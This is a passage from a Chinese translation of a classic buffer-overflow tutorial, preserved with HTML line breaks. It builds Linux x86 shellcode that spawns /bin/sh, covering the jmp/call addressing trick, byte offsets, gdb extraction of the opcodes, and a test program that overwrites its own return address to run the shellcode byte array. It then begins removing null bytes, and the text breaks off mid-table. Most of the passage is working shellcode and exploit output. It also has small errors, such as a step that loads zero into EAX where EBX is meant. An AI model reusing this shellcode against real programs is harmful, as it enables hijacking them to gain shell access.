assembler dump.<BR>------------------------------------------------------------------------------<BR><BR>&nbsp;&nbsp;&nbsp; 系统调用exit会把0x1放到寄存器EAX中, 在EBX中放置退出码, 并且执行"int 0x80".<BR>就这些了! 大多数应用程序在退出时返回0, 以表示没有错误. 我们在EBX中也放入0. 现<BR>在我们构造shell code的步骤就是这样的了:<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a) 把以NULL结尾的字串"/bin/sh"放到内存某处.<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; b) 把字串"/bin/sh"的地址放到内存某处, 后面跟一个空的长字(null long word)<BR>.<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; c) 把0xb放到寄存器EAX中.<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; d) 把字串"/bin/sh"的地址放到寄存器EBX中.<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; e) 把字串"/bin/sh"地址的地址放到寄存器ECX中.<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (注: 原文d和e步骤把EBX和ECX弄反了)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; f) 把空长字的地址放到寄存器EDX中.<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; g) 执行指令int $0x80.<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; h) 把0x1放到寄存器EAX中.<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; i) 把0x0放到寄存器EAX中.<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; j) 执行指令int $0x80.&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp; 试着把这些步骤变成汇编语言, 把字串放到代码后面. 别忘了在数组后面放上字串<BR>地址和空字, 我们有如下的代码:<BR><BR>------------------------------------------------------------------------------<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; string_addr,string_addr_addr<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movb&nbsp;&nbsp; $0x0,null_byte_addr<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0x0,null_addr<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0xb,%eax<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; string_addr,%ebx<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; leal&nbsp;&nbsp; string_addr,%ecx<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; leal&nbsp;&nbsp; null_string,%edx<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp; $0x80<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0x1, %eax<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0x0, %ebx<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp; $0x80<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /bin/sh string goes here.<BR>------------------------------------------------------------------------------<BR><BR>&nbsp;&nbsp;&nbsp; 问题是我们不知道在要破解的程序的内存空间中, 上述代码(和其后的字串)会被放到<BR>哪里. 一种解决方法是使用JMP和CALL指令. JMP和CALL指令使用相对IP的寻址方式, 也就<BR>是说我们可以跳到距离当前IP一定间距的某个位置, 而不必知道那个位置在内存中的确切<BR>地址. 如果我们在字串"/bin/sh"之前放一个CALL指令, 并由一个JMP指令转到CALL指令上.<BR>当CALL指令执行的时候, 字串的地址会被作为返回地址压入堆栈之中. 我们所需要的就是<BR>把返回地址放到一个寄存器之中. CALL指令只是调用我们上述的代码就可以了. 假定J代<BR>表JMP指令, C代表CALL指令, s代表字串, 执行过程如下所示:<BR><BR><BR>内存低&nbsp;&nbsp;&nbsp;&nbsp; DDDDDDDDEEEEEEEEEEEE&nbsp; EEEE&nbsp; FFFF&nbsp; FFFF&nbsp; FFFF&nbsp; FFFF&nbsp;&nbsp;&nbsp;&nbsp; 内存高<BR>地址&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 89ABCDEF0123456789AB&nbsp; CDEF&nbsp; 0123&nbsp; 4567&nbsp; 89AB&nbsp; CDEF&nbsp;&nbsp;&nbsp;&nbsp; 地址<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; buffer&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sfp&nbsp;&nbsp; ret&nbsp;&nbsp; a&nbsp;&nbsp;&nbsp;&nbsp; b&nbsp;&nbsp;&nbsp;&nbsp; c<BR><BR>&lt;------&nbsp;&nbsp; [JJSSSSSSSSSSSSSSCCss][ssss][0xD8][0x01][0x02][0x03]<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ^|^&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ^|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |||_____________||____________| (1)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (2)&nbsp; ||_____________||<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |______________| (3)<BR><BR>堆栈顶部&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 堆栈底部<BR><BR>&nbsp;&nbsp;&nbsp; 运用上述的修正方法, 并使用相对索引寻址, 我们代码中每条指令的字节数目如下:<BR>&nbsp;&nbsp;&nbsp; <BR><BR>------------------------------------------------------------------------------<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jmp&nbsp;&nbsp;&nbsp; offset-to-call&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 2 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; popl&nbsp;&nbsp; %esi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 1 byte<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %esi,array-offset(%esi)&nbsp; # 3 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movb&nbsp;&nbsp; $0x0,nullbyteoffset(%esi)# 4 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0x0,null-offset(%esi)&nbsp;&nbsp; # 7 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0xb,%eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 5 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %esi,%ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 2 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; leal&nbsp;&nbsp; array-offset(%esi),%ecx&nbsp; # 3 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; leal&nbsp;&nbsp; null-offset(%esi),%edx&nbsp;&nbsp; # 3 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp; $0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 2 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0x1, %eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 5 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0x0, %ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 5 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp; $0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 2 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp; offset-to-popl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 5 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /bin/sh string goes here.<BR>------------------------------------------------------------------------------<BR>&nbsp; <BR>&nbsp;&nbsp;&nbsp; 通过计算从jmp到call, 从call到popl, 从字串地址到数组, 从字串地址到空长字的<BR>偏量, 我们得到:<BR><BR><BR>------------------------------------------------------------------------------<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jmp&nbsp;&nbsp;&nbsp; 0x26&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 2 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; popl&nbsp;&nbsp; %esi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 1 byte<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %esi,0x8(%esi)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 3 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movb&nbsp;&nbsp; $0x0,0x7(%esi)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 4 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0x0,0xc(%esi)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 7 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0xb,%eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 5 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %esi,%ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 2 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; leal&nbsp;&nbsp; 0x8(%esi),%ecx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 3 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; leal&nbsp;&nbsp; 0xc(%esi),%edx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 3 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp; $0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 2 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0x1, %eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 5 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0x0, %ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 5 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp; $0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 2 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp; -0x2b&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 5 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; .string \"/bin/sh\"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 8 bytes<BR>------------------------------------------------------------------------------<BR>&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp; 这看起来很不错了. 为了确保代码能够正常工作必须编译并执行. 但是还有一个问题.<BR>我们的代码修改了自身, 可是多数操作系统将代码页标记为只读. 为了绕过这个限制我们<BR>必须把要执行的代码放到堆栈或数据段中, 并且把控制转到那里. 为此应该把代码放到数<BR>据段中的全局数组中. 我们首先需要用16进制表示的二进制代码. 先编译, 然后再用gdb<BR>来取得二进制代码.<BR><BR><BR>shellcodeasm.c<BR>------------------------------------------------------------------------------<BR>void main() {<BR>__asm__("<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jmp&nbsp;&nbsp;&nbsp; 0x2a&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 3 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; popl&nbsp;&nbsp; %esi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 1 byte<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %esi,0x8(%esi)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 3 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movb&nbsp;&nbsp; $0x0,0x7(%esi)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 4 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0x0,0xc(%esi)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 7 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0xb,%eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 5 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %esi,%ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 2 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; leal&nbsp;&nbsp; 0x8(%esi),%ecx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 3 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; leal&nbsp;&nbsp; 0xc(%esi),%edx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 3 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp; $0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 2 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0x1, %eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 5 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0x0, %ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 5 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp; $0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 2 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp; -0x2f&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 5 bytes<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; .string \"/bin/sh\"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 8 bytes<BR>");<BR>}<BR>------------------------------------------------------------------------------<BR><BR>------------------------------------------------------------------------------<BR>[aleph1]$ gcc -o shellcodeasm -g -ggdb shellcodeasm.c<BR>[aleph1]$ gdb shellcodeasm<BR>GDB is free software and you are welcome to distribute copies of it<BR> under certain conditions; type "show copying" to see the conditions.<BR>There is absolutely no warranty for GDB; type "show warranty" for details.<BR>GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc...<BR>(gdb) disassemble main<BR>Dump of assembler code for function main:<BR>0x8000130 &lt;main&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pushl&nbsp; %ebp<BR>0x8000131 &lt;main+1&gt;:&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %esp,%ebp<BR>0x8000133 &lt;main+3&gt;:&nbsp;&nbsp;&nbsp;&nbsp; jmp&nbsp;&nbsp;&nbsp; 0x800015f &lt;main+47&gt;<BR>0x8000135 &lt;main+5&gt;:&nbsp;&nbsp;&nbsp;&nbsp; popl&nbsp;&nbsp; %esi<BR>0x8000136 &lt;main+6&gt;:&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %esi,0x8(%esi)<BR>0x8000139 &lt;main+9&gt;:&nbsp;&nbsp;&nbsp;&nbsp; movb&nbsp;&nbsp; $0x0,0x7(%esi)<BR>0x800013d &lt;main+13&gt;:&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0x0,0xc(%esi)<BR>0x8000144 &lt;main+20&gt;:&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0xb,%eax<BR>0x8000149 &lt;main+25&gt;:&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %esi,%ebx<BR>0x800014b &lt;main+27&gt;:&nbsp;&nbsp;&nbsp; leal&nbsp;&nbsp; 0x8(%esi),%ecx<BR>0x800014e &lt;main+30&gt;:&nbsp;&nbsp;&nbsp; leal&nbsp;&nbsp; 0xc(%esi),%edx<BR>0x8000151 &lt;main+33&gt;:&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp; $0x80<BR>0x8000153 &lt;main+35&gt;:&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0x1,%eax<BR>0x8000158 &lt;main+40&gt;:&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0x0,%ebx<BR>0x800015d &lt;main+45&gt;:&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp; $0x80<BR>0x800015f &lt;main+47&gt;:&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp; 0x8000135 &lt;main+5&gt;<BR>0x8000164 &lt;main+52&gt;:&nbsp;&nbsp;&nbsp; das<BR>0x8000165 &lt;main+53&gt;:&nbsp;&nbsp;&nbsp; boundl 0x6e(%ecx),%ebp<BR>0x8000168 &lt;main+56&gt;:&nbsp;&nbsp;&nbsp; das<BR>0x8000169 &lt;main+57&gt;:&nbsp;&nbsp;&nbsp; jae&nbsp;&nbsp;&nbsp; 0x80001d3 &lt;__new_exitfn+55&gt;<BR>0x800016b &lt;main+59&gt;:&nbsp;&nbsp;&nbsp; addb&nbsp;&nbsp; %cl,0x55c35dec(%ecx)<BR>End of assembler dump.<BR>(gdb) x/bx main+3<BR>0x8000133 &lt;main+3&gt;:&nbsp;&nbsp;&nbsp;&nbsp; 0xeb<BR>(gdb)<BR>0x8000134 &lt;main+4&gt;:&nbsp;&nbsp;&nbsp;&nbsp; 0x2a<BR>(gdb)<BR>.<BR>.<BR>.<BR>------------------------------------------------------------------------------<BR><BR>testsc.c<BR>------------------------------------------------------------------------------<BR>char shellcode[] =<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00"<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\x00\xb8\x0b\x00\x00\x00\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80"<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xd1\xff\xff"<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec\x5d\xc3";<BR><BR>void main() {<BR>&nbsp;&nbsp; int *ret;<BR><BR>&nbsp;&nbsp; ret = (int *)&amp;ret + 2;<BR>&nbsp;&nbsp; (*ret) = (int)shellcode;<BR><BR>}<BR>------------------------------------------------------------------------------<BR>------------------------------------------------------------------------------<BR>[aleph1]$ gcc -o testsc testsc.c<BR>[aleph1]$ ./testsc<BR>$ exit<BR>[aleph1]$<BR>------------------------------------------------------------------------------<BR><BR>&nbsp;&nbsp;&nbsp; 成了! 但是这里还有一个障碍, 在多数情况下, 我们都是试图使一个字符缓冲区溢出.<BR>那么在我们shellcode中的任何NULL字节都会被认为是字符串的结尾, 复制工作就到此为<BR>止了. 对于我们的破解工作来说, 在shellcode里不能有NULL字节. 下面来消除这些字节,<BR>同时把代码精简一点.<BR><BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Problem instruction:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Substitute with:<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --------------------------------------------------------<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movb&nbsp;&nbsp; $0x0,0x7(%esi)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xorl&nbsp;&nbsp; %eax,%eax<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; molv&nbsp;&nbsp; $0x0,0xc(%esi)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movb&nbsp;&nbsp; %eax,0x7(%esi)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %eax,0xc(%esi)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --------------------------------------------------------<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; $0xb,%eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movb&nbsp;&nbsp; 